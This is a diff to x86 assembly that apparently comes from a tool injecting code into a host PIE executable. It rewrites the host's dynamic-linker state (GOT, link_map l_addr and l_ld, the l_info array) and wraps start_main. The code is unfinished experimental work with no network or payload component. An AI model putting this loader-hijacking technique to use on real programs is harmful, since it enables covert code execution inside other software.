@@ -33,6 +33,7 @@
 	global get_base_pie
 	global do_patch_pie
 	global patch_host_dynamic_reloc
+	global patch_l_info
 	
 	extern _DYNAMIC
 	extern _GLOBAL_OFFSET_TABLE_
@@ -163,7 +164,7 @@ patch_link_map:
 	call get_dynamic_pie
 	mov [ecx+8], eax	;link_map[0].l_ld = my_dynamic_section
 	call get_base_pie
-	;; 	mov [ecx], eax		;link_map[0].l_addr= my_base_load
+	mov [ecx], eax		;link_map[0].l_addr= my_base_load
 	
 	;; link_map[0].l_addr is used as an offset into the GOT
 	;; 0xb7fec2df <_dl_fixup+271>:	mov    DWORD PTR [edx+ebp*1],eax
@@ -335,13 +336,16 @@ start_main_wrapper_alt:
 
 do_patch_pie:
 	call patchmygotpie
-	;;call fixdynamicpie
-	call patch_host_dynamic_reloc
-	;; 	call patch_link_map ; does this even do anything?
+	call fixdynamicpie
+	;; 	call patch_host_dynamic_reloc
+ 	call patch_link_map ; does this even do anything?
+	call patch_l_info
 	ret
 
 	
-	%define RELOC 17
+	%define RELOC 0x17
+	;; this function is bad.
+	;; the reloc section of the host is not writable
 patch_host_dynamic_reloc:
 	call get_link_map	; get host got
 	mov eax,[eax+8]		; eax has the got	
@@ -362,6 +366,36 @@ patch_host_dynamic_reloc:
 	mov [ecx+4], eax 	;patch it!
 	ret
 
-
+	
+	;; the structure we're looking to patch
+	;; is located directly behind the first element
+	;; of the link_map linked list
+	;; the index of pointers in this list coresponds
+	;; to the magic value inside the .dynamic section
+patch_l_info:
+	call get_link_map
+	add eax,0x20
+	mov edx,eax
+	call get_dynamic_pie
+.begin:
+	mov ecx,[eax]		;grab element from dynamic
+	test ecx, ecx
+	jz patch_l_info.done
+	;;
+	cmp ecx,32
+	;;
+	jb  patch_l_info.patch
+	;; 	cmp ecx,RELOC
+	;; 	jz patch_l_info.patch
+	add eax,8		;walk dynamic
+	jmp patch_l_info.begin
+.patch:
+	shl ecx,2
+	mov [edx+ecx], eax	;index l_info with ecx
+	add eax,8
+	jmp patch_l_info.begin
+.done:
+	ret
+	
 
 	
